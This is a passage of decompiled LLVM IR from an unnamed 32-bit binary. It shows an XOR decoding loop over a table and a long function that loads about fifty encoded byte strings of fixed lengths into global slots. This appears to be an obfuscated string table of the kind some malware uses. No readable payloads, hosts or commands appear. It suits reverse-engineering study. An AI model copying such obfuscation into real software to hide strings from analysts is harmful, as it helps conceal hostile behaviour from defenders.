  %v0_805133a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805133a = inttoptr i32 %v0_805133a to i32*
  %v2_805133a = load i32, i32* %v1_805133a, align 4
  %v2_805133c = add i32 %v2_805133a, %v0_8051338
  %v0_805133e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051340 = inttoptr i32 %v2_805133c to i8*
  %v2_8051340 = load i8, i8* %v1_8051340, align 1
  %v4_8051340 = trunc i32 %v0_805133e to i8
  %v5_8051340 = xor i8 %v2_8051340, %v4_8051340
  store i8 %v5_8051340, i8* %v1_8051340, align 1
  %v0_8051342 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051344 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051344 = inttoptr i32 %v0_8051344 to i32*
  %v2_8051344 = load i32, i32* %v1_8051344, align 4
  %v1_8051346 = add i32 %v0_8051342, 1
  store i32 %v1_8051346, i32* %edx.global-to-local, align 4
  %v2_8051347 = add i32 %v2_8051344, %v0_8051342
  %v2_8051349 = load i8, i8* %stack_var_-44, align 1
  %v1_805134c = inttoptr i32 %v2_8051347 to i8*
  %v2_805134c = load i8, i8* %v1_805134c, align 1
  %v5_805134c = xor i8 %v2_805134c, %v2_8051349
  store i8 %v5_805134c, i8* %v1_805134c, align 1
  %v0_805134e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805134e = add i32 %v0_805134e, 4
  %v2_805134e = inttoptr i32 %v1_805134e to i32*
  %v3_805134e = load i32, i32* %v2_805134e, align 4
  %v1_8051351 = urem i32 %v3_805134e, 65536
  %v1_8051356 = load i32, i32* %edx.global-to-local, align 4
  %v8_8051358 = icmp sgt i32 %v1_8051351, %v1_8051356
  br i1 %v8_8051358, label %dec_label_pc_8051324.dec_label_pc_8051324_crit_edge, label %dec_label_pc_805135a.loopexit

dec_label_pc_8051324.dec_label_pc_8051324_crit_edge: ; preds = %dec_label_pc_8051324
  %v0_805132a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051324

dec_label_pc_805135a.loopexit:                    ; preds = %dec_label_pc_8051324
  br label %dec_label_pc_805135a

dec_label_pc_805135a:                             ; preds = %dec_label_pc_805135a.loopexit, %dec_label_pc_80512f0
  %v0_8051361 = phi i32 [ %v1_8051351, %dec_label_pc_805135a.loopexit ], [ %v1_8051304, %dec_label_pc_80512f0 ]
  ret i32 %v0_8051361

; uselistorder directives
  uselistorder i32 %v1_8051356, { 1, 0 }
  uselistorder i32 %v1_8051351, { 1, 0 }
  uselistorder i32 %v0_805134e, { 1, 0 }
  uselistorder i32 %v1_8051304, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056980.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_80567fc.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056980.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8051370() local_unnamed_addr {
dec_label_pc_8051370:
  %v1_8051376 = call i32 @function_8052b74(i32 10)
  store i32 %v1_8051376, i32* @ebx, align 4
  %v4_8051388 = call i32 @function_8051ca0(i32 %v1_8051376, i32 ptrtoint ([11 x i8]* @global_var_8054d4f.54 to i32), i32 10)
  %v0_805138d = load i32, i32* @ebx, align 4
  store i32 %v0_805138d, i32* @global_var_8056998.55, align 8
  store i16 10, i16* bitcast (i32* @global_var_805699c.56 to i16*), align 4
  %v1_80513a3 = call i32 @function_8052b74(i32 2)
  store i32 %v1_80513a3, i32* @ebx, align 4
  %v4_80513b5 = call i32 @function_8051ca0(i32 %v1_80513a3, i32 ptrtoint ([3 x i8]* @global_var_8054d44.57 to i32), i32 2)
  %v0_80513ba = load i32, i32* @ebx, align 4
  store i32 %v0_80513ba, i32* @global_var_80569a0.58, align 32
  store i16 2, i16* bitcast (i32* @global_var_80569a4.59 to i16*), align 4
  %v1_80513d0 = call i32 @function_8052b74(i32 18)
  store i32 %v1_80513d0, i32* @ebx, align 4
  %v4_80513e2 = call i32 @function_8051ca0(i32 %v1_80513d0, i32 ptrtoint ([19 x i8]* @global_var_8054d47.60 to i32), i32 18)
  %v0_80513e7 = load i32, i32* @ebx, align 4
  store i32 %v0_80513e7, i32* @global_var_8056a10.61, align 16
  store i16 18, i16* bitcast (i32* @global_var_8056a14.62 to i16*), align 4
  %v1_80513fd = call i32 @function_8052b74(i32 2)
  store i32 %v1_80513fd, i32* @ebx, align 4
  %v4_805140f = call i32 @function_8051ca0(i32 %v1_80513fd, i32 ptrtoint (i32* @global_var_8054d5a.63 to i32), i32 2)
  %v0_8051414 = load i32, i32* @ebx, align 4
  store i32 %v0_8051414, i32* @global_var_8056a18.64, align 8
  store i16 2, i16* bitcast (i32* @global_var_8056a1c.65 to i16*), align 4
  %v1_805142a = call i32 @function_8052b74(i32 15)
  store i32 %v1_805142a, i32* @ebx, align 4
  %v4_805143c = call i32 @function_8051ca0(i32 %v1_805142a, i32 ptrtoint (i32* @global_var_8054d5d.66 to i32), i32 15)
  %v0_8051441 = load i32, i32* @ebx, align 4
  store i32 %v0_8051441, i32* @global_var_8056990.67, align 16
  store i16 15, i16* bitcast (i32* @global_var_8056994.68 to i16*), align 4
  %v1_8051457 = call i32 @function_8052b74(i32 29)
  store i32 %v1_8051457, i32* @ebx, align 4
  %v4_8051469 = call i32 @function_8051ca0(i32 %v1_8051457, i32 ptrtoint (i32* @global_var_8054d6d.69 to i32), i32 29)
  %v0_805146e = load i32, i32* @ebx, align 4
  store i32 %v0_805146e, i32* @global_var_80569a8.70, align 8
  store i16 29, i16* bitcast (i32* @global_var_80569ac.71 to i16*), align 4
  %v1_8051484 = call i32 @function_8052b74(i32 7)
  store i32 %v1_8051484, i32* @ebx, align 4
  %v4_8051496 = call i32 @function_8051ca0(i32 %v1_8051484, i32 ptrtoint ([8 x i8]* @global_var_8054d8b.72 to i32), i32 7)
  %v0_805149b = load i32, i32* @ebx, align 4
  store i32 %v0_805149b, i32* @global_var_80569b0.73, align 16
  store i16 7, i16* bitcast (i32* @global_var_80569b4.74 to i16*), align 4
  %v1_80514b1 = call i32 @function_8052b74(i32 5)
  store i32 %v1_80514b1, i32* @ebx, align 4
  %v4_80514c3 = call i32 @function_8051ca0(i32 %v1_80514b1, i32 ptrtoint ([6 x i8]* @global_var_8054d93.75 to i32), i32 5)
  %v0_80514c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80514c8, i32* @global_var_80569b8.76, align 8
  store i16 5, i16* bitcast (i32* @global_var_80569bc.77 to i16*), align 4
  %v1_80514de = call i32 @function_8052b74(i32 11)
  store i32 %v1_80514de, i32* @ebx, align 4
  %v4_80514f0 = call i32 @function_8051ca0(i32 %v1_80514de, i32 ptrtoint (i32* @global_var_8054d99.78 to i32), i32 11)
  %v0_80514f5 = load i32, i32* @ebx, align 4
  store i32 %v0_80514f5, i32* @global_var_80569c0.79, align 64
  store i16 11, i16* bitcast (i32* @global_var_80569c4.80 to i16*), align 4
  %v1_805150b = call i32 @function_8052b74(i32 4)
  store i32 %v1_805150b, i32* @ebx, align 4
  %v4_805151d = call i32 @function_8051ca0(i32 %v1_805150b, i32 ptrtoint ([5 x i8]* @global_var_8054da5.81 to i32), i32 4)
  %v0_8051522 = load i32, i32* @ebx, align 4
  store i32 %v0_8051522, i32* @global_var_80569c8.82, align 8
  store i16 4, i16* bitcast (i32* @global_var_80569cc.83 to i16*), align 4
  %v1_8051538 = call i32 @function_8052b74(i32 7)
  store i32 %v1_8051538, i32* @ebx, align 4
  %v4_805154a = call i32 @function_8051ca0(i32 %v1_8051538, i32 ptrtoint ([8 x i8]* @global_var_8054daa.84 to i32), i32 7)
  %v0_805154f = load i32, i32* @ebx, align 4
  store i32 %v0_805154f, i32* @global_var_80569d0.85, align 16
  store i16 7, i16* bitcast (i32* @global_var_80569d4.86 to i16*), align 4
  %v1_8051565 = call i32 @function_8052b74(i32 8)
  store i32 %v1_8051565, i32* @ebx, align 4
  %v4_8051577 = call i32 @function_8051ca0(i32 %v1_8051565, i32 ptrtoint ([9 x i8]* @global_var_8054db2.87 to i32), i32 8)
  %v0_805157c = load i32, i32* @ebx, align 4
  store i32 %v0_805157c, i32* @global_var_80569d8.88, align 8
  store i16 8, i16* bitcast (i32* @global_var_80569dc.89 to i16*), align 4
  %v1_8051592 = call i32 @function_8052b74(i32 13)
  store i32 %v1_8051592, i32* @ebx, align 4
  %v4_80515a4 = call i32 @function_8051ca0(i32 %v1_8051592, i32 ptrtoint (i32* @global_var_8054dbb.90 to i32), i32 13)
  %v0_80515a9 = load i32, i32* @ebx, align 4
  store i32 %v0_80515a9, i32* @global_var_80569e0.91, align 32
  store i16 13, i16* bitcast (i32* @global_var_80569e4.92 to i16*), align 4
  %v1_80515bf = call i32 @function_8052b74(i32 10)
  store i32 %v1_80515bf, i32* @ebx, align 4
  %v4_80515d1 = call i32 @function_8051ca0(i32 %v1_80515bf, i32 ptrtoint ([11 x i8]* @global_var_8054dc9.93 to i32), i32 10)
  %v0_80515d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80515d6, i32* @global_var_80569e8.94, align 8
  store i16 10, i16* bitcast (i32* @global_var_80569ec.95 to i16*), align 4
  %v1_80515ec = call i32 @function_8052b74(i32 10)
  store i32 %v1_80515ec, i32* @ebx, align 4
  %v4_80515fe = call i32 @function_8051ca0(i32 %v1_80515ec, i32 ptrtoint ([11 x i8]* @global_var_8054dd4.96 to i32), i32 10)
  %v0_8051603 = load i32, i32* @ebx, align 4
  store i32 %v0_8051603, i32* @global_var_80569f0.97, align 16
  store i16 10, i16* bitcast (i32* @global_var_80569f4.98 to i16*), align 4
  %v1_8051619 = call i32 @function_8052b74(i32 33)
  store i32 %v1_8051619, i32* @ebx, align 4
  %v4_805162b = call i32 @function_8051ca0(i32 %v1_8051619, i32 ptrtoint (i32* @global_var_8054f54.99 to i32), i32 33)
  %v0_8051630 = load i32, i32* @ebx, align 4
  store i32 %v0_8051630, i32* @global_var_80569f8.100, align 8
  store i16 33, i16* bitcast (i32* @global_var_80569fc.101 to i16*), align 4
  %v1_8051646 = call i32 @function_8052b74(i32 8)
  store i32 %v1_8051646, i32* @ebx, align 4
  %v4_8051658 = call i32 @function_8051ca0(i32 %v1_8051646, i32 ptrtoint ([9 x i8]* @global_var_8054ddf.102 to i32), i32 8)
  %v0_805165d = load i32, i32* @ebx, align 4
  store i32 %v0_805165d, i32* @global_var_8056a00.103, align 512
  store i16 8, i16* bitcast (i32* @global_var_8056a04.104 to i16*), align 4
  %v1_8051673 = call i32 @function_8052b74(i32 11)
  store i32 %v1_8051673, i32* @ebx, align 4
  %v4_8051685 = call i32 @function_8051ca0(i32 %v1_8051673, i32 ptrtoint ([12 x i8]* @global_var_8054de8.105 to i32), i32 11)
  %v0_805168a = load i32, i32* @ebx, align 4
  store i32 %v0_805168a, i32* @global_var_8056a08.106, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056a0c.107 to i16*), align 4
  %v1_80516a0 = call i32 @function_8052b74(i32 6)
  store i32 %v1_80516a0, i32* @ebx, align 4
  %v4_80516b2 = call i32 @function_8051ca0(i32 %v1_80516a0, i32 ptrtoint ([7 x i8]* @global_var_8054df4.108 to i32), i32 6)
  %v0_80516b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80516b7, i32* @global_var_8056a20.109, align 32
  store i16 6, i16* bitcast (i32* @global_var_8056a24.110 to i16*), align 4
  %v1_80516cd = call i32 @function_8052b74(i32 7)
  store i32 %v1_80516cd, i32* @ebx, align 4
  %v4_80516df = call i32 @function_8051ca0(i32 %v1_80516cd, i32 ptrtoint ([8 x i8]* @global_var_8054dfb.111 to i32), i32 7)
  %v0_80516e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80516e4, i32* @global_var_8056a28.112, align 8
  store i16 7, i16* bitcast (i32* @global_var_8056a2c.113 to i16*), align 4
  %v1_80516fa = call i32 @function_8052b74(i32 7)
  store i32 %v1_80516fa, i32* @ebx, align 4
  %v4_805170c = call i32 @function_8051ca0(i32 %v1_80516fa, i32 ptrtoint ([8 x i8]* @global_var_8054e03.114 to i32), i32 7)
  %v0_8051711 = load i32, i32* @ebx, align 4
  store i32 %v0_8051711, i32* @global_var_8056a30.115, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056a34.116 to i16*), align 4
  %v1_8051727 = call i32 @function_8052b74(i32 3)
  store i32 %v1_8051727, i32* @ebx, align 4
  %v4_8051739 = call i32 @function_8051ca0(i32 %v1_8051727, i32 ptrtoint ([4 x i8]* @global_var_8054e0b.117 to i32), i32 3)
  %v0_805173e = load i32, i32* @ebx, align 4
  store i32 %v0_805173e, i32* @global_var_8056a38.118, align 8
  store i16 3, i16* bitcast (i32* @global_var_8056a3c.119 to i16*), align 4
  %v1_8051754 = call i32 @function_8052b74(i32 19)
  store i32 %v1_8051754, i32* @ebx, align 4
  %v4_8051766 = call i32 @function_8051ca0(i32 %v1_8051754, i32 ptrtoint (i32* @global_var_8054e0f.120 to i32), i32 19)
  %v0_805176b = load i32, i32* @ebx, align 4
  store i32 %v0_805176b, i32* @global_var_8056a40.121, align 64
  store i16 19, i16* bitcast (i32* @global_var_8056a44.122 to i16*), align 4
  %v1_8051781 = call i32 @function_8052b74(i32 24)
  store i32 %v1_8051781, i32* @ebx, align 4
  %v4_8051793 = call i32 @function_8051ca0(i32 %v1_8051781, i32 ptrtoint (i32* @global_var_8054e23.123 to i32), i32 24)
  %v0_8051798 = load i32, i32* @ebx, align 4
  store i32 %v0_8051798, i32* @global_var_8056a48.124, align 8
  store i16 24, i16* bitcast (i32* @global_var_8056a4c.125 to i16*), align 4
  %v1_80517ae = call i32 @function_8052b74(i32 9)
  store i32 %v1_80517ae, i32* @ebx, align 4
  %v4_80517c0 = call i32 @function_8051ca0(i32 %v1_80517ae, i32 ptrtoint ([10 x i8]* @global_var_8054e3c.126 to i32), i32 9)
  %v0_80517c5 = load i32, i32* @ebx, align 4
  store i32 %v0_80517c5, i32* @global_var_8056a50.127, align 16
  store i16 9, i16* bitcast (i32* @global_var_8056a54.128 to i16*), align 4
  %v1_80517db = call i32 @function_8052b74(i32 16)
  store i32 %v1_80517db, i32* @ebx, align 4
  %v4_80517ed = call i32 @function_8051ca0(i32 %v1_80517db, i32 ptrtoint (i32* @global_var_8054e46.129 to i32), i32 16)
  %v0_80517f2 = load i32, i32* @ebx, align 4
  store i32 %v0_80517f2, i32* @global_var_8056a58.130, align 8
  store i16 16, i16* bitcast (i32* @global_var_8056a5c.131 to i16*), align 4
  %v1_8051808 = call i32 @function_8052b74(i32 22)
  store i32 %v1_8051808, i32* @ebx, align 4
  %v4_805181a = call i32 @function_8051ca0(i32 %v1_8051808, i32 ptrtoint (i32* @global_var_8054e57.132 to i32), i32 22)
  %v0_805181f = load i32, i32* @ebx, align 4
  store i32 %v0_805181f, i32* @global_var_8056a60.133, align 32
  store i16 22, i16* bitcast (i32* @global_var_8056a64.134 to i16*), align 4
  %v1_8051835 = call i32 @function_8052b74(i32 21)
  store i32 %v1_8051835, i32* @ebx, align 4
  %v4_8051847 = call i32 @function_8051ca0(i32 %v1_8051835, i32 ptrtoint (i32* @global_var_8054e6e.135 to i32), i32 21)
  %v0_805184c = load i32, i32* @ebx, align 4
  store i32 %v0_805184c, i32* @global_var_8056a68.136, align 8
  store i16 21, i16* bitcast (i32* @global_var_8056a6c.137 to i16*), align 4
  %v1_8051862 = call i32 @function_8052b74(i32 17)
  store i32 %v1_8051862, i32* @ebx, align 4
  %v4_8051874 = call i32 @function_8051ca0(i32 %v1_8051862, i32 ptrtoint ([18 x i8]* @global_var_8054e84.138 to i32), i32 17)
  %v0_8051879 = load i32, i32* @ebx, align 4
  store i32 %v0_8051879, i32* @global_var_8056a70.139, align 16
  store i16 17, i16* bitcast (i32* @global_var_8056a74.140 to i16*), align 4
  %v1_805188f = call i32 @function_8052b74(i32 12)
  store i32 %v1_805188f, i32* @ebx, align 4
  %v4_80518a1 = call i32 @function_8051ca0(i32 %v1_805188f, i32 ptrtoint (i32* @global_var_8054e96.141 to i32), i32 12)
  %v0_80518a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80518a6, i32* @global_var_8056a78.142, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056a7c.143 to i16*), align 4
  %v1_80518bc = call i32 @function_8052b74(i32 23)
  store i32 %v1_80518bc, i32* @ebx, align 4
  %v4_80518ce = call i32 @function_8051ca0(i32 %v1_80518bc, i32 ptrtoint (i32* @global_var_8054ea3.144 to i32), i32 23)
  %v0_80518d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80518d3, i32* @global_var_8056a80.145, align 128
  store i16 23, i16* bitcast (i32* @global_var_8056a84.146 to i16*), align 4
  %v1_80518e9 = call i32 @function_8052b74(i32 83)
  store i32 %v1_80518e9, i32* @ebx, align 4
  %v4_80518fb = call i32 @function_8051ca0(i32 %v1_80518e9, i32 ptrtoint (i32* @global_var_8054f78.147 to i32), i32 83)
  %v0_8051900 = load i32, i32* @ebx, align 4
  store i32 %v0_8051900, i32* @global_var_8056a88.148, align 8
  store i16 83, i16* bitcast (i32* @global_var_8056a8c.149 to i16*), align 4
  %v1_8051916 = call i32 @function_8052b74(i32 32)
  store i32 %v1_8051916, i32* @ebx, align 4
  %v4_8051928 = call i32 @function_8051ca0(i32 %v1_8051916, i32 ptrtoint (i32* @global_var_8054fcc.150 to i32), i32 32)
  %v0_805192d = load i32, i32* @ebx, align 4
  store i32 %v0_805192d, i32* @global_var_8056a90.151, align 16
  store i16 32, i16* bitcast (i32* @global_var_8056a94.152 to i16*), align 4
  %v1_8051943 = call i32 @function_8052b74(i32 48)
  store i32 %v1_8051943, i32* @ebx, align 4
  %v4_8051955 = call i32 @function_8051ca0(i32 %v1_8051943, i32 ptrtoint (i32* @global_var_8054ff0.153 to i32), i32 48)
  %v0_805195a = load i32, i32* @ebx, align 4
  store i32 %v0_805195a, i32* @global_var_8056a98.154, align 8
  store i16 48, i16* bitcast (i32* @global_var_8056a9c.155 to i16*), align 4
  %v1_8051970 = call i32 @function_8052b74(i32 12)
  store i32 %v1_8051970, i32* @ebx, align 4
  %v4_8051982 = call i32 @function_8051ca0(i32 %v1_8051970, i32 ptrtoint (i32* @global_var_8054ebb.156 to i32), i32 12)
  %v0_8051987 = load i32, i32* @ebx, align 4
  store i32 %v0_8051987, i32* @global_var_8056aa0.157, align 32
  store i16 12, i16* bitcast (i32* @global_var_8056aa4.158 to i16*), align 4
  %v1_805199d = call i32 @function_8052b74(i32 9)
  store i32 %v1_805199d, i32* @ebx, align 4
  %v4_80519af = call i32 @function_8051ca0(i32 %v1_805199d, i32 ptrtoint (i32* @global_var_8054ec8.159 to i32), i32 9)
  %v0_80519b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80519b4, i32* @global_var_8056aa8.160, align 8
  store i16 9, i16* bitcast (i32* @global_var_8056aac.161 to i16*), align 4
  %v1_80519ca = call i32 @function_8052b74(i32 10)
  store i32 %v1_80519ca, i32* @ebx, align 4
  %v4_80519dc = call i32 @function_8051ca0(i32 %v1_80519ca, i32 ptrtoint (i32* @global_var_8054ed2.162 to i32), i32 10)
  %v0_80519e1 = load i32, i32* @ebx, align 4
  store i32 %v0_80519e1, i32* @global_var_8056ab0.163, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056ab4.164 to i16*), align 4
  %v1_80519f7 = call i32 @function_8052b74(i32 12)
  store i32 %v1_80519f7, i32* @ebx, align 4
  %v4_8051a09 = call i32 @function_8051ca0(i32 %v1_80519f7, i32 ptrtoint (i32* @global_var_8054edd.165 to i32), i32 12)
  %v0_8051a0e = load i32, i32* @ebx, align 4
  store i32 %v0_8051a0e, i32* @global_var_8056ab8.166, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056abc.167 to i16*), align 4
  %v1_8051a24 = call i32 @function_8052b74(i32 16)
  store i32 %v1_8051a24, i32* @ebx, align 4
  %v4_8051a36 = call i32 @function_8051ca0(i32 %v1_8051a24, i32 ptrtoint (i32* @global_var_8054eea.168 to i32), i32 16)
  %v0_8051a3b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a3b, i32* @global_var_8056ac0.169, align 64
  store i16 16, i16* bitcast (i32* @global_var_8056ac4.170 to i16*), align 4
  %v1_8051a51 = call i32 @function_8052b74(i32 19)
  store i32 %v1_8051a51, i32* @ebx, align 4
  %v4_8051a63 = call i32 @function_8051ca0(i32 %v1_8051a51, i32 ptrtoint (i32* @global_var_8054efb.171 to i32), i32 19)
  %v0_8051a68 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a68, i32* @global_var_8056ac8.172, align 8
  store i16 19, i16* bitcast (i32* @global_var_8056acc.173 to i16*), align 4
  %v1_8051a7e = call i32 @function_8052b74(i32 8)
  store i32 %v1_8051a7e, i32* @ebx, align 4
  %v4_8051a90 = call i32 @function_8051ca0(i32 %v1_8051a7e, i32 ptrtoint ([9 x i8]* @global_var_8054f0f.174 to i32), i32 8)
  %v0_8051a95 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a95, i32* @global_var_8056ad0.175, align 16
  store i16 8, i16* bitcast (i32* @global_var_8056ad4.176 to i16*), align 4
  %v1_8051aab = call i32 @function_8052b74(i32 11)
  store i32 %v1_8051aab, i32* @ebx, align 4
  %v4_8051abd = call i32 @function_8051ca0(i32 %v1_8051aab, i32 ptrtoint (i32* @global_var_8054eaf.177 to i32), i32 11)
  %v0_8051ac2 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ac2, i32* @global_var_8056ad8.178, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056adc.179 to i16*), align 4
  %v1_8051ad8 = call i32 @function_8052b74(i32 12)
  store i32 %v1_8051ad8, i32* @ebx, align 4
  %v4_8051aea = call i32 @function_8051ca0(i32 %v1_8051ad8, i32 ptrtoint (i32* @global_var_8054f18.180 to i32), i32 12)
  %v0_8051aef = load i32, i32* @ebx, align 4
  store i32 %v0_8051aef, i32* @global_var_8056ae0.181, align 32
  store i16 12, i16* bitcast (i32* @global_var_8056ae4.182 to i16*), align 4
  %v1_8051b05 = call i32 @function_8052b74(i32 18)
  store i32 %v1_8051b05, i32* @ebx, align 4
  %v4_8051b17 = call i32 @function_8051ca0(i32 %v1_8051b05, i32 ptrtoint (i32* @global_var_8054f25.183 to i32), i32 18)
  %v0_8051b1c = load i32, i32* @ebx, align 4
  store i32 %v0_8051b1c, i32* @global_var_8056ae8.184, align 8
  store i16 18, i16* bitcast (i32* @global_var_8056aec.185 to i16*), align 4
  %v1_8051b32 = call i32 @function_8052b74(i32 25)
  store i32 %v1_8051b32, i32* @ebx, align 4
  %v4_8051b44 = call i32 @function_8051ca0(i32 %v1_8051b32, i32 ptrtoint (i32* @global_var_8054f38.186 to i32), i32 25)
  %v0_8051b49 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b49, i32* @global_var_8056af0.187, align 16
  store i16 25, i16* bitcast (i32* @global_var_8056af4.188 to i16*), align 4
  %v1_8051b5f = call i32 @function_8052b74(i32 111)
  store i32 %v1_8051b5f, i32* @ebx, align 4
  %v4_8051b71 = call i32 @function_8051ca0(i32 %v1_8051b5f, i32 ptrtoint (i32* @global_var_8055024.189 to i32), i32 111)
  %v0_8051b76 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b76, i32* @global_var_8056af8.190, align 8
  store i16 111, i16* bitcast (i32* @global_var_8056afc.191 to i16*), align 4
  %v1_8051b8c = call i32 @function_8052b74(i32 111)
  store i32 %v1_8051b8c, i32* @ebx, align 4
  %v4_8051b9e = call i32 @function_8051ca0(i32 %v1_8051b8c, i32 ptrtoint (i32* @global_var_8055094.192 to i32), i32 111)
  %v0_8051ba3 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ba3, i32* @global_var_8056b00.193, align 256
  store i16 111, i16* bitcast (i32* @global_var_8056b04.194 to i16*), align 4
  %v1_8051bb9 = call i32 @function_8052b74(i32 110)
  store i32 %v1_8051bb9, i32* @ebx, align 4
  %v4_8051bcb = call i32 @function_8051ca0(i32 %v1_8051bb9, i32 ptrtoint (i32* @global_var_8055104.195 to i32), i32 110)
  %v0_8051bd0 = load i32, i32* @ebx, align 4
  store i32 %v0_8051bd0, i32* @global_var_8056b08.196, align 8
  store i16 110, i16* bitcast (i32* @global_var_8056b0c.197 to i16*), align 4
  %v1_8051be6 = call i32 @function_8052b74(i32 110)
  store i32 %v1_8051be6, i32* @ebx, align 4
  %v4_8051bf8 = call i32 @function_8051ca0(i32 %v1_8051be6, i32 ptrtoint (i32* @global_var_8055174.198 to i32), i32 110)
  %v0_8051bfd = load i32, i32* @ebx, align 4
  store i32 %v0_8051bfd, i32* @global_var_8056b10.199, align 16
  store i16 110, i16* bitcast (i32* @global_var_8056b14.200 to i16*), align 4
  %v1_8051c13 = call i32 @function_8052b74(i32 117)
  store i32 %v1_8051c13, i32* @ebx, align 4
  %v4_8051c25 = call i32 @function_8051ca0(i32 %v1_8051c13, i32 ptrtoint (i32* @global_var_80551e4.201 to i32), i32 117)
  %v0_8051c2a = load i32, i32* @ebx, align 4
  store i32 %v0_8051c2a, i32* @global_var_8056b18.202, align 8
  store i16 117, i16* bitcast (i32* @global_var_8056b1c.203 to i16*), align 4
  ret i32 %v4_8051c25

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8051ca0, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_8051c40(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051c40:
  %v4_8051c40 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c40, i32* @edx, align 4
  %v2_8051c46 = load i8, i8* %arg1, align 1
  %v3_8051c46 = icmp eq i8 %v2_8051c46, 0
  br i1 %v3_8051c46, label %dec_label_pc_8051c57, label %dec_label_pc_8051c50

dec_label_pc_8051c50:                             ; preds = %dec_label_pc_8051c40, %dec_label_pc_8051c50
  %v0_8051c50 = phi i32 [ %v1_8051c50, %dec_label_pc_8051c50 ], [ 0, %dec_label_pc_8051c40 ]
  %v1_8051c50 = add i32 %v0_8051c50, 1
  %v2_8051c51 = add i32 %v1_8051c50, %v4_8051c40
  %v3_8051c51 = inttoptr i32 %v2_8051c51 to i8*
  %v4_8051c51 = load i8, i8* %v3_8051c51, align 1
  %v5_8051c51 = icmp eq i8 %v4_8051c51, 0
  %v1_8051c55 = icmp eq i1 %v5_8051c51, false
  br i1 %v1_8051c55, label %dec_label_pc_8051c50, label %dec_label_pc_8051c57

dec_label_pc_8051c57:                             ; preds = %dec_label_pc_8051c50, %dec_label_pc_8051c40
  %v0_8051c57 = phi i32 [ 0, %dec_label_pc_8051c40 ], [ %v1_8051c50, %dec_label_pc_8051c50 ]
  ret i32 %v0_8051c57

; uselistorder directives
  uselistorder label %dec_label_pc_8051c50, { 1, 0 }
}

define i32 @function_8051c60(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051c60:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051c61 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c61, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8051c66 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c66, i32* %edx.global-to-local, align 4
  %v2_8051c6a = load i8, i8* %tmp15, align 1
  %v3_8051c6a = icmp eq i8 %v2_8051c6a, 0
  br i1 %v3_8051c6a, label %dec_label_pc_8051c94, label %dec_label_pc_8051c6f

dec_label_pc_8051c6f:                             ; preds = %dec_label_pc_8051c60
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c71

dec_label_pc_8051c71:                             ; preds = %dec_label_pc_8051c71, %dec_label_pc_8051c6f
  %v0_8051c71 = phi i32 [ %v1_8051c71, %dec_label_pc_8051c71 ], [ 0, %dec_label_pc_8051c6f ]
  %v1_8051c71 = add i32 %v0_8051c71, 1
  store i32 %v1_8051c71, i32* %esi.global-to-local, align 4
  %v2_8051c72 = add i32 %v1_8051c71, %arg2
  %v3_8051c72 = inttoptr i32 %v2_8051c72 to i8*
  %v4_8051c72 = load i8, i8* %v3_8051c72, align 1
  %v5_8051c72 = icmp eq i8 %v4_8051c72, 0
  %v1_8051c76 = icmp eq i1 %v5_8051c72, false
  br i1 %v1_8051c76, label %dec_label_pc_8051c71, label %dec_label_pc_8051c78

dec_label_pc_8051c78:                             ; preds = %dec_label_pc_8051c71
  %v10_8051c78 = icmp eq i32 %v0_8051c71, -2
  br i1 %v10_8051c78, label %dec_label_pc_8051c8f, label %dec_label_pc_8051c7d

dec_label_pc_8051c7d:                             ; preds = %dec_label_pc_8051c78
  store i32 %v4_8051c66, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8051c71, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c83

dec_label_pc_8051c83:                             ; preds = %dec_label_pc_8051c94, %dec_label_pc_8051c7d, %dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge
  %v2_8051c86 = phi i32 [ %v1_8051c89, %dec_label_pc_8051c83.dec_label_pc_8051c83_crit_edge ], [ %v4_8051c66, %dec_label_pc_8051c7d ], [ %v4_8051c66, %dec_label_pc_8051c94 ]
